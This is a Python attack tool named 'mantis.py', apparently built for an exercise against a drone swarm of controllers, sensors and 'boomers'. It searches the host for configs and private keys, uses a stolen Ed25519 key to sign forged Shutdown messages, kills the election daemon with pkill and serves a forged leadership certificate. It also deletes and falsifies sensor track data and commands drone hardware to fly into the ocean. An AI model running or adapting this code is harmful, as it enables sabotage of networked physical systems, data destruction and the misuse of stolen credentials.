#!/usr/bin/env python3
"""
mantis.py v3 — Hydra Swarm Killer (Signed Edition)
====================================================
FIXES FROM v2:
  - Ed25519 signing using node's key_path from config
  - Correct comms socket semantics: local writes are OUTBOUND QUEUE
    (delivered when destination polls or pushed to peer controllers).
    Writing Shutdown to socket does NOT kill local node — it queues
    it for delivery to the destination.
  - HTTP POST for direct kills when we know endpoints
  - Auto-discovers key from config key_path or /etc/*/key.pem

SIGNATURE FORMAT (matches Go implementation):
  Sign over: destination + source + msg + msg_type + nonce
  Algorithm: Ed25519 (PKCS#8 PEM → 32-byte seed)

Usage:
    python3 mantis.py              # auto
    python3 mantis.py recon        # recon only
    python3 mantis.py kill         # full kill chain
    python3 mantis.py divert       # sensor track divert
"""

import json, os, re, socket, sqlite3, subprocess, sys, time
import threading, uuid, glob, base64, struct
from typing import Optional, List, Tuple, Any

# ── Output ───────────────────────────────────────────────
class C:
    R="\033[91m";G="\033[92m";Y="\033[93m";B="\033[96m"
    BOLD="\033[1m";DIM="\033[2m";X="\033[0m"
def info(m):  print(f"{C.B}[*]{C.X} {m}")
def ok(m):    print(f"{C.G}[+]{C.X} {m}")
def warn(m):  print(f"{C.Y}[!]{C.X} {m}")
def err(m):   print(f"{C.R}[-]{C.X} {m}")
def banner(m):print(f"\n{C.BOLD}{C.B}{'='*60}\n  {m}\n{'='*60}{C.X}")

# ── Ed25519 Signing ──────────────────────────────────────
# The Go code signs: destination + source + msg + msg_type + nonce
# Using Ed25519 with PKCS#8 PEM key

_sign_fn = None  # callable(data: bytes) -> bytes, or None

def _extract_ed25519_seed(pem_bytes: bytes) -> Optional[bytes]:
    """Extract 32-byte Ed25519 seed from PKCS#8 PEM.
    PKCS#8 wraps Ed25519 keys in ASN.1. The raw 32-byte seed
    is at the end of the DER structure."""
    # Strip PEM armor
    lines = pem_bytes.decode("ascii", errors="ignore").strip().split("\n")
    b64 = "".join(l.strip() for l in lines
                  if not l.strip().startswith("-----"))
    der = base64.b64decode(b64)

    # Ed25519 PKCS#8 DER is typically 48 bytes:
    #   30 2e (SEQUENCE)
    #     02 01 00 (INTEGER version=0)
    #     30 05 (SEQUENCE - AlgorithmIdentifier)
    #       06 03 2b6570 (OID 1.3.101.112 = Ed25519)
    #     04 22 (OCTET STRING wrapping)
    #       04 20 (OCTET STRING - 32 bytes of key seed)
    #         <32 bytes>
    # Find the last 32 bytes after 04 20
    idx = der.rfind(b'\x04\x20')
    if idx >= 0 and len(der) >= idx + 34:
        return der[idx+2:idx+34]

    # Fallback: just take last 32 bytes if DER is ~48 bytes
    if len(der) >= 48:
        return der[-32:]

    return None

def init_signing(key_path: str):
    """Initialize signing from PEM key file."""
    global _sign_fn
    if not key_path or not os.path.isfile(key_path):
        warn(f"No key file at: {key_path}")
        return False

    try:
        with open(key_path, "rb") as f:
            pem = f.read()
    except Exception as e:
        err(f"Cannot read key: {e}")
        return False

    # Try cryptography library (most likely on NixOS)
    try:
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        key = load_pem_private_key(pem, password=None)
        if isinstance(key, Ed25519PrivateKey):
            _sign_fn = lambda data: key.sign(data)
            ok(f"Signing ready (cryptography lib) from {key_path}")
            return True
    except ImportError:
        pass
    except Exception as e:
        warn(f"cryptography lib: {e}")

    # Try PyNaCl
    try:
        from nacl.signing import SigningKey
        seed = _extract_ed25519_seed(pem)
        if seed and len(seed) == 32:
            sk = SigningKey(seed)
            _sign_fn = lambda data: sk.sign(data).signature
            ok(f"Signing ready (PyNaCl) from {key_path}")
            return True
    except ImportError:
        pass
    except Exception as e:
        warn(f"PyNaCl: {e}")

    # Try pure-python ed25519 fallback via subprocess openssl
    try:
        # Write test data, sign with openssl
        test = subprocess.run(
            ["openssl", "version"], capture_output=True, timeout=3
        )
        if test.returncode == 0:
            def openssl_sign(data: bytes) -> bytes:
                import tempfile
                with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as df:
                    df.write(data)
                    data_path = df.name
                try:
                    result = subprocess.run(
                        ["openssl", "pkeyutl", "-sign",
                         "-inkey", key_path,
                         "-in", data_path],
                        capture_output=True, timeout=5
                    )
                    if result.returncode == 0:
                        return result.stdout
                finally:
                    os.unlink(data_path)
                return b""

            # Test it
            test_sig = openssl_sign(b"test")
            if len(test_sig) == 64:
                _sign_fn = openssl_sign
                ok(f"Signing ready (openssl subprocess) from {key_path}")
                return True
            else:
                warn(f"openssl sign returned {len(test_sig)} bytes, expected 64")
    except Exception as e:
        warn(f"openssl fallback: {e}")

    err(f"Could not initialize signing from {key_path}")
    return False

def sign_transmission(tx: dict) -> dict:
    """Sign a transmission in-place. Matches Go implementation:
    hash = destination + source + msg + msg_type + nonce"""
    if _sign_fn is None:
        return tx  # Send unsigned if no key

    # Generate nonce
    nonce_bytes = os.urandom(16)
    nonce_b64 = base64.urlsafe_b64encode(nonce_bytes).decode().rstrip("=")
    tx["nonce"] = nonce_b64

    # Build sign material (concatenate fields as strings)
    material = (
        tx.get("destination", "") +
        tx.get("source", "") +
        tx.get("msg", "") +
        tx.get("msg_type", "") +
        tx.get("nonce", "")
    ).encode("utf-8")

    try:
        sig = _sign_fn(material)
        tx["msg_sig"] = base64.b64encode(sig).decode()
    except Exception as e:
        warn(f"Signing failed: {e}")

    return tx

# ── Config Discovery ─────────────────────────────────────

def find_yaml_configs() -> List[str]:
    found = []
    for env_key in ["CONTROLLER_CONFIG_PATH","SENSOR_CONFIG_PATH","BOOMER_CONFIG_PATH"]:
        val = os.environ.get(env_key)
        if val and os.path.isfile(val):
            found.append(val)
    for root in ["/etc","/var/lib","/opt","/tmp","/run"]:
        try:
            for dp,dirs,files in os.walk(root):
                for f in files:
                    if f.endswith((".yaml",".yml")):
                        fp = os.path.join(dp,f)
                        if fp not in found: found.append(fp)
                if dp.count(os.sep)-root.count(os.sep)>3: dirs.clear()
        except (PermissionError,OSError): pass
    return found

def parse_yaml_lite(path: str) -> dict:
    try: text = open(path).read()
    except: return {}
    result = {}; list_key = None; cur = None
    for line in text.split("\n"):
        s = line.strip()
        if not s or s.startswith("#"): continue
        ind = len(line)-len(line.lstrip())
        m = re.match(r'^(\w[\w_]*):\s+(.+)$', s)
        if m and ind==0:
            k,v = m.group(1), m.group(2).strip().strip('"').strip("'")
            list_key=None; cur=None
            for c in [lambda x:{"true":True,"false":False}[x.lower()],int,float]:
                try: v=c(v); break
                except: pass
            result[k]=v; continue
        m = re.match(r'^(\w[\w_]*):\s*$', s)
        if m and ind==0:
            list_key=m.group(1); result[list_key]=[]; cur=None; continue
        if s.startswith("- ") and list_key is not None:
            cur={}; result[list_key].append(cur)
            m=re.match(r'^-\s+(\w[\w_]*):\s*(.+)$', s)
            if m: cur[m.group(1)]=m.group(2).strip().strip('"').strip("'")
            continue
        m = re.match(r'^(\w[\w_]*):\s*(.+)$', s)
        if m and ind>0:
            k,v = m.group(1), m.group(2).strip().strip('"').strip("'")
            if cur is not None: cur[k]=v
            else: result[k]=v
    return result

def detect_node_type(cfg):
    if "election_socket_path" in cfg: return "controller"
    if "gps_db_path" in cfg: return "sensor"
    if "hw_socket_path" in cfg: return "boomer"
    return "unknown"

# ── Socket + HTTP ────────────────────────────────────────

def sock_send(path, data, timeout=3.0):
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(timeout); s.connect(path)
        s.sendall(json.dumps(data).encode()); s.close(); return True
    except: return False

def sock_sniff(path, secs=5.0):
    msgs=[]
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(1.0); s.connect(path)
        end=time.time()+secs; buf=b""
        while time.time()<end:
            try:
                ch=s.recv(65536)
                if not ch: break
                buf+=ch
                while buf:
                    buf=buf.lstrip()
                    if not buf or buf[0:1]!=b"{":
                        i=buf.find(b"{")
                        if i<0: buf=b""; break
                        buf=buf[i:]
                    try:
                        o,ei=json.JSONDecoder().raw_decode(buf.decode("utf-8","replace"))
                        msgs.append(o); buf=buf[ei:]
                    except: break
            except socket.timeout: continue
        s.close()
    except: pass
    return msgs

def election_query(path):
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(3.0); s.connect(path)
        raw=s.recv(409600).decode(); s.close()
        return json.loads(raw)
    except: return None

def http_post(url, body, timeout=3.0):
    """Raw HTTP POST — no requests lib needed."""
    try:
        from urllib.parse import urlparse
        p=urlparse(url)
        host,port,path=p.hostname,p.port or 80,p.path or "/"
        payload=json.dumps(body).encode()
        req=(f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Content-Type: application/json\r\nContent-Length: {len(payload)}\r\n"
             f"Connection: close\r\n\r\n").encode()+payload
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(timeout); s.connect((host,port)); s.sendall(req)
        resp=b""
        while True:
            try:
                c=s.recv(4096)
                if not c: break
                resp+=c
            except socket.timeout: break
        s.close()
        r=resp.decode("utf-8","replace")
        sm=re.search(r"HTTP/\d\.\d (\d{3})",r)
        st=int(sm.group(1)) if sm else 0
        bi=r.find("\r\n\r\n")
        return st, r[bi+4:] if bi>=0 else ""
    except Exception as e:
        return 0, str(e)

# ── Transmission Builders (with signing) ─────────────────

def mktx(src, dst, msg_type, payload=None):
    """Build and sign a transmission."""
    t = {
        "destination": dst, "source": src,
        "msg": json.dumps(payload or {}),
        "msg_type": msg_type,
        "msg_sig": "", "nonce": "",
        "authority": {"endorsements": []}
    }
    return sign_transmission(t)

def tx_shutdown(src, dst):
    return mktx(src, dst, "Shutdown")

def tx_engage(src, dst, tid, sid, shost):
    return mktx(src, dst, "Boomer:Engage Request",
                {"track_id":tid,"sensor_id":sid,"sensor_host":shost})

# ── Recon ────────────────────────────────────────────────

class Intel:
    def __init__(self):
        self.node_type="unknown"; self.node_id=""
        self.config={}; self.config_path=""
        self.comms_sock=""; self.election_sock=""
        self.hw_sock=""; self.http_port=0
        self.is_leader=False; self.coa=None
        self.ctrl_ids=[]; self.ctrl_eps=[]
        self.sensor_ids=[]; self.boomer_ids=[]
        self.all_ids=[]; self.db_path=""
        self.iff=""; self.tracks=[]; self.sniffed=[]
        self.key_path=""
        # Discovered from sniffing
        self.sensor_endpoints={}  # sensor_id -> http endpoint

    def summary(self):
        banner("RECON SUMMARY")
        ok(f"Node: {C.BOLD}{self.node_type}{C.X}  ID: {self.node_id}")
        ok(f"Config: {self.config_path}")
        ok(f"Key: {self.key_path}  signing={'ACTIVE' if _sign_fn else 'NONE'}")
        if self.comms_sock: ok(f"Comms:    {self.comms_sock} (exists={os.path.exists(self.comms_sock)})")
        if self.election_sock: ok(f"Election: {self.election_sock} leader={C.BOLD}{self.is_leader}{C.X}")
        if self.hw_sock: ok(f"HW:       {self.hw_sock}")
        if self.db_path: ok(f"SQLite:   {self.db_path} tracks={len(self.tracks)}")
        if self.ctrl_ids:
            info(f"Controllers ({len(self.ctrl_ids)}):")
            for i,c in enumerate(self.ctrl_ids):
                ep=self.ctrl_eps[i] if i<len(self.ctrl_eps) else "?"
                print(f"    {c}  ->  {ep}")
        if self.sensor_ids: info(f"Sensors ({len(self.sensor_ids)})")
        if self.boomer_ids: info(f"Boomers ({len(self.boomer_ids)})")
        if self.sensor_endpoints:
            info(f"Discovered sensor endpoints:")
            for sid,ep in self.sensor_endpoints.items():
                print(f"    {sid[:12]}  ->  {ep}")
        if self.sniffed: info(f"Sniffed {len(self.sniffed)} msgs")
        info(f"Total known UUIDs: {len(self.all_ids)}")
        print()

def recon() -> Intel:
    banner("RECON")
    intel = Intel()

    cfgs = find_yaml_configs()
    if not cfgs:
        err("No config found! Set *_CONFIG_PATH"); sys.exit(1)
    info(f"Found {len(cfgs)} YAML file(s)")

    best,best_path = {},""
    env_paths = {os.environ.get(k,"") for k in
                 ["CONTROLLER_CONFIG_PATH","SENSOR_CONFIG_PATH","BOOMER_CONFIG_PATH"]}
    for cp in cfgs:
        p = parse_yaml_lite(cp)
        if not p.get("id"): continue
        if not best or cp in env_paths:
            best,best_path = p,cp

    if not best:
        err("No valid config"); sys.exit(1)

    intel.config, intel.config_path = best, best_path
    intel.node_id = str(best.get("id",""))
    intel.node_type = detect_node_type(best)
    ok(f"Identified: {intel.node_type} / {intel.node_id}")

    intel.comms_sock    = str(best.get("comms_socket_path",""))
    intel.election_sock = str(best.get("election_socket_path",""))
    intel.hw_sock       = str(best.get("hw_socket_path",""))
    intel.http_port     = int(best.get("listen_port",0))
    intel.db_path       = str(best.get("gps_db_path",""))
    intel.iff           = str(best.get("iff",""))

    # Key discovery — check config key_path, then common locations
    intel.key_path = str(best.get("key_path",""))
    if not intel.key_path or not os.path.isfile(intel.key_path):
        for candidate in ["/etc/controller/key.pem","/etc/sensor/key.pem",
                          "/etc/boomer/key.pem","/etc/mantis/key.pem",
                          "/tmp/key.pem"]:
            if os.path.isfile(candidate):
                intel.key_path = candidate; break
        # Also glob
        if not intel.key_path or not os.path.isfile(intel.key_path):
            for g in glob.glob("/etc/*/*.pem")+glob.glob("/var/lib/*/*.pem"):
                intel.key_path = g; break

    # Init signing
    if intel.key_path and os.path.isfile(intel.key_path):
        init_signing(intel.key_path)
    else:
        warn("No key found — will send unsigned (fails if verify_signatures=true)")

    # Extract peer/worker UUIDs
    for lst,key in [(intel.ctrl_ids,"controllers"),
                    (intel.sensor_ids,"sensors"),
                    (intel.boomer_ids,"boomers")]:
        for entry in best.get(key,[]):
            if isinstance(entry,dict) and entry.get("id"):
                lst.append(entry["id"])
                if key=="controllers":
                    intel.ctrl_eps.append(entry.get("ip_addr",""))

    intel.all_ids = list(set(
        [intel.node_id]+intel.ctrl_ids+intel.sensor_ids+intel.boomer_ids))

    # Leadership
    if intel.election_sock and os.path.exists(intel.election_sock):
        intel.coa = election_query(intel.election_sock)
        if intel.coa:
            n=len(intel.coa.get("endorsements",[]))
            intel.is_leader = n>0
            (ok if intel.is_leader else warn)(f"Leader: {intel.is_leader} ({n} endorsements)")

    # SQLite
    if intel.db_path and os.path.isfile(intel.db_path):
        try:
            conn=sqlite3.connect(intel.db_path)
            intel.tracks=[r[0] for r in conn.execute("SELECT track_id FROM tracks").fetchall()]
            conn.close()
            ok(f"SQLite: {len(intel.tracks)} tracks")
        except Exception as e: warn(f"SQLite: {e}")

    # Sniff comms
    if intel.comms_sock and os.path.exists(intel.comms_sock):
        info("Sniffing comms (3s)...")
        intel.sniffed = sock_sniff(intel.comms_sock, 3.0)
        ok(f"Captured {len(intel.sniffed)} messages")
        for m in intel.sniffed:
            for f in ("source","destination"):
                uid=m.get(f,"")
                if uid and uid not in intel.all_ids:
                    intel.all_ids.append(uid)
            # Discover sensor endpoints from Sensor:Get Tasks
            if m.get("msg_type")=="Sensor:Get Tasks":
                try:
                    inner=json.loads(m.get("msg","{}"))
                    addr=inner.get("server_address","")
                    if addr:
                        intel.sensor_endpoints[m.get("source","")] = addr
                except: pass

    intel.summary()
    return intel

# ── Kill Vectors ─────────────────────────────────────────

def v_shutdown_via_comms(intel: Intel) -> Tuple[int,int]:
    """Write signed Shutdown transmissions to comms socket.

    HOW DELIVERY WORKS:
      - For sensor/boomer UUIDs: message sits in outbound queue.
        When that worker next HTTP polls with Get Tasks, comms
        returns 202 + the queued Shutdown. Worker's comms calls
        os.Exit(0).
      - For peer controller UUIDs: comms has one communicator
        worker per peer that does blocking RetrieveBlocking().
        It picks up our Shutdown and HTTP POSTs it to the peer.

    REQUIRES: we are on the leader controller (only leader accepts
    worker polls, so only leader's queue matters for workers).
    Peer controller delivery works from any controller.
    """
    banner("SHUTDOWN VIA COMMS SOCKET")
    if not intel.comms_sock or not os.path.exists(intel.comms_sock):
        err("No comms socket"); return 0,0

    targets = [u for u in intel.all_ids if u != intel.node_id]
    info(f"Queueing Shutdown for {len(targets)} targets...")
    sent=failed=0
    for tid in targets:
        if sock_send(intel.comms_sock, tx_shutdown(intel.node_id, tid)):
            sent+=1; ok(f"  queued -> {tid[:12]}...")
        else:
            failed+=1; warn(f"  failed -> {tid[:12]}...")
        time.sleep(0.03)

    info(f"Queued: {sent} ok, {failed} failed")
    if not intel.is_leader:
        warn("We are NOT leader — worker shutdowns will only deliver")
        warn("if/when workers poll us. Peer controller shutdowns will")
        warn("still be pushed via communicator workers.")
    return sent,failed

def v_shutdown_http_direct(intel: Intel) -> Tuple[int,int]:
    """HTTP POST Shutdown directly to every known endpoint.
    Works for peer controllers. Also works for sensors if we
    know their endpoints (discovered from sniffing)."""
    banner("HTTP SHUTDOWN SPRAY")
    sent=failed=0

    # Hit peer controllers
    for i,ep in enumerate(intel.ctrl_eps):
        if not ep: continue
        cid=intel.ctrl_ids[i] if i<len(intel.ctrl_ids) else ""
        t=tx_shutdown(intel.node_id, cid)
        status,_=http_post(ep, t)
        if status in (200,202):
            sent+=1; ok(f"  ctrl -> {ep} ({status})")
        else:
            failed+=1; warn(f"  ctrl -> {ep} (status={status})")

    # Hit discovered sensor endpoints
    for sid,ep in intel.sensor_endpoints.items():
        # Sensors listen on /tracks/ but also accept transmissions
        # via the same server — try posting shutdown
        t=tx_shutdown(intel.node_id, sid)
        status,_=http_post(ep, t)
        if status in (200,202):
            sent+=1; ok(f"  sensor -> {ep} ({status})")
        else:
            # Sensors may only have /tracks/ route, try that
            tracks_url = ep.rstrip("/") + "/tracks/"
            status2,_=http_post(tracks_url, t)
            if status2 in (200,202):
                sent+=1; ok(f"  sensor -> {tracks_url} ({status2})")
            else:
                failed+=1

    info(f"HTTP spray: {sent}/{sent+failed}")
    return sent,failed

def v_election_replace(intel: Intel, mode="empty") -> bool:
    """Replace election socket. Only pkill in the whole script —
    election daemon only processes Election: messages so it can't
    be protocol-killed via Shutdown."""
    banner(f"ELECTION REPLACE ({mode})")
    if not intel.election_sock:
        warn("No election socket — not a controller?"); return False

    info("Stopping election daemon...")
    try:
        subprocess.run(["pkill","-f","election"],capture_output=True,timeout=3)
        time.sleep(0.3)
    except: pass

    for _ in range(5):
        try:
            if os.path.exists(intel.election_sock): os.unlink(intel.election_sock)
            break
        except OSError: time.sleep(0.5)

    if mode=="empty":
        payload=json.dumps({"endorsements":[]}).encode()
    else:
        now=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())
        exp=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+7200))
        es=[{"valid_after":now,"expiration":exp,
             "endorser":c,"endorsee":intel.node_id,"signature":""}
            for c in intel.ctrl_ids+[intel.node_id]]
        payload=json.dumps({"endorsements":es}).encode()

    def serve():
        try:
            srv=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
            srv.bind(intel.election_sock)
            os.chmod(intel.election_sock,0o777)
            srv.listen(32); srv.settimeout(1.0)
            ok(f"Serving {mode} COA on {intel.election_sock}")
            while True:
                try:
                    c,_=srv.accept(); c.sendall(payload); c.close()
                except socket.timeout: continue
                except: pass
        except Exception as e: err(f"Election server: {e}")

    threading.Thread(target=serve,daemon=True).start()
    time.sleep(0.5)

    coa=election_query(intel.election_sock)
    if coa is not None:
        n=len(coa.get("endorsements",[]))
        if (mode=="empty" and n==0) or (mode=="forge" and n>0):
            ok(f"Verified: {mode} COA ({n} endorsements)")
            if mode=="forge": intel.is_leader=True
            return True
    warn("COA verification failed"); return False

def v_sqlite_poison(intel: Intel) -> bool:
    """Nuke tracks DB and keep it empty."""
    banner("SQLITE POISON")
    db=intel.db_path
    if not db:
        for p in glob.glob("/var/lib/*/tracks.db")+glob.glob("/tmp/tracks.db"):
            db=p; break
    if not db or not os.path.isfile(db):
        warn("No tracks DB"); return False
    try:
        conn=sqlite3.connect(db)
        before=conn.execute("SELECT COUNT(*) FROM tracks").fetchone()[0]
        conn.execute("DELETE FROM tracks"); conn.commit()
        ok(f"Deleted {before} tracks")
        def wipe():
            for _ in range(600):
                try:
                    c=sqlite3.connect(db)
                    c.execute("DELETE FROM tracks")
                    c.commit(); c.close()
                except: pass
                time.sleep(0.5)
        threading.Thread(target=wipe,daemon=True).start()
        ok("Wipe thread running (5 min)")
        conn.close(); return True
    except Exception as e:
        err(f"SQLite: {e}"); return False

def v_track_divert(intel: Intel) -> bool:
    """Replace track coords with ocean coordinates."""
    banner("TRACK DIVERT")
    db=intel.db_path
    if not db or not os.path.isfile(db):
        warn("No tracks DB"); return False
    dlat,dlon = 58.0,-52.0
    try:
        conn=sqlite3.connect(db)
        n=conn.execute("UPDATE tracks SET latitude=?,longitude=?",(dlat,dlon)).rowcount
        conn.commit(); ok(f"Diverted {n} tracks to {dlat}N {dlon}W")
        def loop():
            for i in range(600):
                try:
                    c=sqlite3.connect(db)
                    c.execute("UPDATE tracks SET latitude=?,longitude=?",
                              (dlat+(i%10)*0.01,dlon)); c.commit(); c.close()
                except: pass
                time.sleep(0.5)
        threading.Thread(target=loop,daemon=True).start()
        ok("Divert thread running"); conn.close(); return True
    except Exception as e:
        err(f"Divert: {e}"); return False

def v_boomer_misdirect(intel: Intel) -> int:
    """Queue phantom engage requests via comms socket."""
    banner("BOOMER MISDIRECT")
    if not intel.comms_sock or not os.path.exists(intel.comms_sock):
        err("No comms socket"); return 0
    sent=0
    for bid in intel.boomer_ids:
        t=tx_engage(intel.node_id,bid,
                    f"phantom-{bid[:8]}",str(uuid.uuid4()),
                    "http://127.0.0.1:1/")
        if sock_send(intel.comms_sock,t):
            sent+=1; ok(f"  -> {bid[:12]}...")
        time.sleep(0.02)
    info(f"Misdirected {sent} boomers"); return sent

def v_hw_divert(intel: Intel) -> bool:
    """Send GO_TO to fly boomer into ocean."""
    banner("HW DIVERT")
    if not intel.hw_sock or not os.path.exists(intel.hw_sock):
        warn("No hw socket"); return False
    cmd={"command":"GO_TO","latitude":70.0,"longitude":-30.0,"altitude":10.0}
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(3.0); s.connect(intel.hw_sock)
        s.sendall(json.dumps(cmd).encode())
        resp=s.recv(4096).decode(); s.close()
        ok(f"GO_TO -> {resp[:80]}")
        def loop():
            for _ in range(300):
                try:
                    s2=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
                    s2.settimeout(2.0); s2.connect(intel.hw_sock)
                    s2.sendall(json.dumps(cmd).encode())
                    s2.recv(4096); s2.close()
                except: pass
                time.sleep(1)
        threading.Thread(target=loop,daemon=True).start()
        ok("HW divert loop running"); return True
    except Exception as e:
        err(f"HW divert: {e}"); return False

# ── Kill Chain ───────────────────────────────────────────

def kill(intel: Intel):
    banner(f"KILL CHAIN — {intel.node_type.upper()}")
    r={}

    if intel.node_type=="controller":
        # If not leader, forge leadership first so workers poll us
        if not intel.is_leader:
            info("Not leader — forging leadership so workers poll us...")
            r["forge"] = v_election_replace(intel,"forge")
            time.sleep(1.5)  # Let control daemon pick up forged COA

        # Queue shutdowns for all workers + peers via comms socket
        r["comms_shutdown"] = v_shutdown_via_comms(intel)

        # HTTP spray peer controllers directly
        r["http_shutdown"] = v_shutdown_http_direct(intel)

        # Misdirect boomers
        if intel.comms_sock and os.path.exists(intel.comms_sock):
            r["misdirect"] = v_boomer_misdirect(intel)

        # NOW lobotomize ourselves — replace forged COA with empty
        # so even after comms restarts, this controller stays passive
        time.sleep(2)  # Wait for queued shutdowns to deliver
        r["lobotomize"] = v_election_replace(intel,"empty")

    elif intel.node_type=="sensor":
        r["poison"] = v_sqlite_poison(intel)
        r["divert"] = v_track_divert(intel)
        r["comms_shutdown"] = v_shutdown_via_comms(intel)
        r["http_shutdown"] = v_shutdown_http_direct(intel)

    elif intel.node_type=="boomer":
        r["hw_divert"] = v_hw_divert(intel)
        r["comms_shutdown"] = v_shutdown_via_comms(intel)

    else:
        warn("Unknown node — trying everything")
        v_shutdown_via_comms(intel)
        v_sqlite_poison(intel)

    banner("RESULTS")
    for k,v in r.items(): ok(f"  {k}: {v}")

    # Verify
    time.sleep(1)
    if intel.election_sock:
        coa=election_query(intel.election_sock)
        if coa and len(coa.get("endorsements",[]))==0:
            ok("Election: empty COA — controller lobotomized")

def do_divert(intel: Intel):
    if intel.node_type=="sensor":
        v_track_divert(intel); v_sqlite_poison(intel)
    elif intel.node_type=="boomer":
        v_hw_divert(intel)

# ── Main ─────────────────────────────────────────────────

def main():
    mode = sys.argv[1].lower().strip() if len(sys.argv)>1 else "auto"
    print(f"""{C.BOLD}{C.R}
  ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗
  ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
  ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
  ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
  ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
  ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{C.X}{C.DIM}  Signed Swarm Killer v3 • Gilded Guardian{C.X}
""")

    if mode=="recon": recon()
    elif mode=="kill": kill(recon())
    elif mode=="divert": do_divert(recon())
    elif mode=="auto":
        intel=recon()
        if intel.node_type=="sensor":
            do_divert(intel); time.sleep(1)
        kill(intel)
    else:
        err(f"Unknown mode: {mode}")
        print("Usage: python3 mantis.py [recon|kill|divert|auto]")
        sys.exit(1)

if __name__=="__main__":
    main()